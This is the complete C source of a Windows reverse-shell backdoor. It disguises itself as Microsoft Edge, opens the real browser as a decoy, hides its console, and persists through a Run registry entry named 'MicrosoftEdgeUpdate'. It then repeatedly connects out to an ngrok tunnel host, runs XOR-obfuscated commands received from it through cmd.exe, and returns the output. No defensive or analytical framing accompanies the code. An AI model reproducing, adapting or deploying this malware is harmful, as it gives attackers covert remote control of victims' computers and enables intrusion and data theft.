#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iphlpapi.h>
#include <shellapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#define KEY 0x3A

void XOR(char* data, size_t data_len) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= KEY;
    }
}

void HexEncode(const char* input, char* output, size_t input_len) {
    const char hex[] = "0123456789ABCDEF";
    for (size_t i = 0; i < input_len; i++) {
        output[i * 2] = hex[(input[i] >> 4) & 0xF];
        output[i * 2 + 1] = hex[input[i] & 0xF];
    }
    output[input_len * 2] = '\0';
}

int HexDecode(const char* input, char* output) {
    char buf[3] = {0};
    int len = strlen(input) / 2;
    for (int i = 0; i < len; i++) {
        buf[0] = input[i * 2];
        buf[1] = input[i * 2 + 1];
        output[i] = (char)strtol(buf, NULL, 16);
    }
    output[len] = '\0';
    return len;
}

int RunCommand(const char* cmd, char* output, size_t output_size) {
    // Use cmd.exe /c instead of powershell for better compatibility
    char full_cmd[4096];
    _snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /c %s", cmd);

    // Redirect stderr to stdout too
    char final_cmd[4096];
    _snprintf(final_cmd, sizeof(final_cmd), "%s 2>&1", full_cmd);

    FILE* fp = _popen(final_cmd, "r");
    if (!fp) {
        _snprintf(output, output_size, "Command execution failed\r\n");
        return -1;
    }

    size_t total = 0;
    char temp[1024];
    while (fgets(temp, sizeof(temp), fp)) {
        size_t len = strlen(temp);
        if (total + len >= output_size - 1)
            break;
        memcpy(output + total, temp, len);
        total += len;
    }

    int status = _pclose(fp);

    if (total == 0) {
        _snprintf(output, output_size, "Command completed (exit code: %d)\r\n", status);
        total = strlen(output);
    }

    return status;
}

void RegistryPersist() {
    HKEY hkey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        RegSetValueExA(hkey, "MicrosoftEdgeUpdate", 0, REG_SZ,
                       (BYTE*)path, strlen(path));
        RegCloseKey(hkey);
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    SetConsoleTitleA("Microsoft Edge");
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    ShellExecuteA(NULL, "open", "msedge.exe", NULL, NULL, SW_SHOWNORMAL);
    RegistryPersist();

    const char* host = "0.tcp.in.ngrok.io";
    const int port = 27507;

    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    struct hostent* remote;

    char recv_buf[4096], cmd_buf[4096], result[32768], hex_buf[65536];

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return 1;

    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            Sleep(3000);
            continue;
        }

        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        remote = gethostbyname(host);
        if (!remote) {
            closesocket(sock);
            Sleep(3000);
            continue;
        }
        memcpy(&server.sin_addr, remote->h_addr_list[0], remote->h_length);

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            closesocket(sock);
            Sleep(3000);
            continue;
        }

        while (1) {
            memset(recv_buf, 0, sizeof(recv_buf));
            memset(cmd_buf, 0, sizeof(cmd_buf));
            memset(result, 0, sizeof(result));
            memset(hex_buf, 0, sizeof(hex_buf));

            int bytes_recv = recv(sock, recv_buf, sizeof(recv_buf) - 1, 0);
            if (bytes_recv <= 0)
                break;

            // Trim whitespace/newlines from received data
            char* end = recv_buf + strlen(recv_buf) - 1;
            while (end > recv_buf && (*end == '\n' || *end == '\r' || *end == ' '))
                *end-- = '\0';

            int decoded_len = HexDecode(recv_buf, cmd_buf);
            XOR(cmd_buf, decoded_len);

            if (strcmp(cmd_buf, "exit") == 0)
                break;

            // Execute command
            RunCommand(cmd_buf, result, sizeof(result));

            size_t result_len = strlen(result);
            XOR(result, result_len);
            HexEncode(result, hex_buf, result_len);
            send(sock, hex_buf, strlen(hex_buf), 0);
        }

        closesocket(sock);
        Sleep(3000);
    }

    WSACleanup();
    return 0;
}
